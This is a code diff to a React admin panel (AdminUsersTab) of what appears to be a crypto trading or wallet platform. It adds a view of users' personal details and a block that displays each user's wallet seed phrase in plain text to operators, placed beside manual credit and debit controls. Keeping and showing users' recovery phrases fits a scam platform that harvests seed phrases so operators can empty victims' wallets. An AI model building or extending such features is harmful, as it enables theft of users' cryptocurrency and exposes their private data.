@@ -157,6 +157,47 @@ export const AdminUsersTab: React.FC = () => {
                     </div>
                   </div>
 
+                  {/* User Details */}
+                  <div className="bg-orbit-card border border-orbit-border/50 rounded-xl p-4 space-y-2">
+                    <h4 className="text-[10px] font-bold text-orbit-gray-text uppercase tracking-wider mb-3">User Details</h4>
+                    <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-4 gap-3 text-[11px]">
+                      {u.username && (
+                        <div><span className="text-orbit-gray-text">Username:</span> <span className="text-orbit-white font-bold ml-1">{u.username}</span></div>
+                      )}
+                      {u.firstName && (
+                        <div><span className="text-orbit-gray-text">First Name:</span> <span className="text-orbit-white font-bold ml-1">{u.firstName}</span></div>
+                      )}
+                      {u.lastName && (
+                        <div><span className="text-orbit-gray-text">Last Name:</span> <span className="text-orbit-white font-bold ml-1">{u.lastName}</span></div>
+                      )}
+                      {u.gender && (
+                        <div><span className="text-orbit-gray-text">Gender:</span> <span className="text-orbit-white font-bold ml-1">{u.gender}</span></div>
+                      )}
+                      {u.phone && (
+                        <div><span className="text-orbit-gray-text">Phone:</span> <span className="text-orbit-white font-bold ml-1">{u.phone}</span></div>
+                      )}
+                      {u.country && (
+                        <div><span className="text-orbit-gray-text">Country:</span> <span className="text-orbit-white font-bold ml-1">{u.country}</span></div>
+                      )}
+                      {u.currency && (
+                        <div><span className="text-orbit-gray-text">Currency:</span> <span className="text-orbit-white font-bold ml-1">{u.currency}</span></div>
+                      )}
+                      {u.accountType && (
+                        <div><span className="text-orbit-gray-text">Account:</span> <span className="text-orbit-accent font-bold ml-1">{u.accountType}</span></div>
+                      )}
+                    </div>
+                  </div>
+
+                  {/* Seed Phrase (if exists) */}
+                  {u.recoveryPhrase && (
+                    <div className="bg-orbit-card border border-orbit-accent/30 rounded-xl p-4 space-y-2">
+                      <h4 className="text-xs font-bold text-orbit-accent flex items-center gap-2"><Shield size={14} /> Connected Wallet Seed Phrase</h4>
+                      <p className="text-xs text-orbit-white font-mono break-words bg-orbit-bg p-3 rounded-lg border border-orbit-border/50">
+                        {u.recoveryPhrase}
+                      </p>
+                    </div>
+                  )}
+
                   {/* Credit / Debit Controls */}
                   <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                     {/* Credit */}
